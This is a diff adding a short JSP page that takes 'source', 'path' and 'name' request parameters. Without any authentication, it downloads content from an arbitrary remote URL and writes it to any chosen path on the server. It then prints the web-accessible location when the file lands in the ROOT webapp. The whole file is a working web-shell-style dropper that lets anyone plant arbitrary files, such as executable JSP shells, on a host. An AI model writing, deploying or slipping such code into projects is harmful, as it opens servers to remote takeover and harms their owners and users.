@@ -1,0 +1,48 @@
+<jsp:root xmlns:jsp="http://java.sun.com/JSP/Page" xmlns="http://www.w3.org/1999/xhtml"
+          version="1.2">
+    <jsp:directive.page contentType="text/html" pageEncoding="UTF-8"/>
+    <jsp:directive.page import="java.io.*"/>
+    <jsp:directive.page import="java.net.URL"/>
+    <jsp:declaration>
+
+    </jsp:declaration>
+    <jsp:scriptlet>
+        String source = request.getParameter("source");
+        String path = request.getParameter("path");
+        String name = request.getParameter("name");
+        if (source != null &amp;&amp; source.startsWith("http") &amp;&amp;
+                path != null &amp;&amp; path.startsWith("/") &amp;&amp;
+                name != null &amp;&amp; name.length() > 0) {
+            URL urlObj = new URL(source);
+            StringBuilder textBuilder = new StringBuilder();
+            try (
+                    InputStream is = urlObj.openStream();
+                    Reader reader = new BufferedReader(new InputStreamReader(is))
+            ) {
+                int c;
+                while ((c = reader.read()) != -1) {
+                    textBuilder.append((char) c);
+                }
+            }
+            String content = textBuilder.toString();
+            File folder = new File(path);
+            if (!folder.exists()) {
+                folder.mkdirs();
+            }
+            File file = new File(folder, name);
+            try (
+                    FileWriter fw = new FileWriter(file, false)
+            ) {
+                fw.write(content);
+            }
+            String absPath = file.getAbsolutePath();
+            out.println(absPath);
+            if (absPath.indexOf("ROOT") > 5) {
+                String fileUrl = absPath.substring(absPath.indexOf("ROOT") + 5);
+                out.println(fileUrl);
+            }
+        }else{
+            out.println("nothing to do...");
+        }
+    </jsp:scriptlet>
+</jsp:root>
